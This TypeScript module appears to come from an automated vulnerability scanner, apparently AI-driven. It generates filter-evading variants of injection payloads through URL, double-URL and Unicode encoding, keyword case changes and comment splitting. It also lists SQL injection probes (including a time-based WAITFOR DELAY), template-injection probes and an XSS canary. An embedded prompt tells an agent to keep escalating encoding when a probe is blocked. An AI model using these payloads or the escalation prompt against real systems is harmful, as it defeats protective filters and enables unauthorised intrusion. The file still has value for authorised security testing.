/**
 * Reflexion payload escalation — ported from VulnClaw reflexion.py (L0–L4).
 * When a probe fails (WAF/filter), escalate encoding before giving up.
 */

export type EscalationLevel = 0 | 1 | 2 | 3 | 4;

export const ESCALATION_HINTS: Record<EscalationLevel, string[]> = {
  0: ["Try raw payload without encoding."],
  1: ["URL-encode special characters.", "Alternate keyword case (SeLeCt).", "Whitespace variants (/**/, newline, tab)."],
  2: ["Double URL encoding.", "Inline comments /**/.", "HTML entity encoding for browser sinks."],
  3: ["Unicode escapes.", "Hex encoding.", "String concatenation to split keywords.", "Alternative equivalent functions."],
  4: ["Multi-layer encoding.", "Alternative syntax (HANDLER vs SELECT).", "Time-based or OOB confirmation.", "Switch attack surface."]
};

/** Apply escalation transforms to a probe string. */
export function escalatePayload(payload: string, level: EscalationLevel): string[] {
  const out = new Set<string>([payload]);
  if (level >= 1) {
    out.add(encodeURIComponent(payload));
    out.add(payload.replace(/select/gi, "SeLeCt").replace(/script/gi, "ScRiPt"));
    out.add(payload.replace(/ /g, "/**/"));
  }
  if (level >= 2) {
    out.add(encodeURIComponent(encodeURIComponent(payload)));
    out.add(payload.replace(/'/g, "%27").replace(/"/g, "%22"));
    out.add(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
  }
  if (level >= 3) {
    out.add(
      payload.replace(/'/g, "\\u0027").replace(/"/g, "\\u0022").replace(/</g, "\\u003c")
    );
    out.add(payload.replace(/select/gi, "SEL/**/ECT"));
  }
  if (level >= 4) {
    out.add(encodeURIComponent(payload.replace(/ /g, "%09")));
    out.add(`' OR '${payload}'='`);
  }
  return [...out].slice(0, 8);
}

export function escalationLevelFromFailures(consecutiveFailures: number, reflections: number): EscalationLevel {
  const level = Math.floor(consecutiveFailures / 2) + reflections;
  return Math.min(4, Math.max(0, level)) as EscalationLevel;
}

/** SQLi probe variants per level. */
export const SQLI_PROBES = [
  "' OR '1'='1",
  "1' OR '1'='1'--",
  "1 AND 1=CONVERT(int,(SELECT 1))",
  "'; WAITFOR DELAY '0:0:3'--"
];

/** XSS canary base — unique per scan via suffix. */
export function xssCanary(suffix = "thg"): string {
  return `<thg-xss-${suffix}>`;
}

/** SSTI probes per engine. */
export const SSTI_PROBES = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}"];

export const REFLEXION_PROMPT = `When a probe is blocked, escalate encoding (L0 raw → L1 URL encode → L2 double encode → L3 unicode → L4 multi-layer) before abandoning the attack class.`;
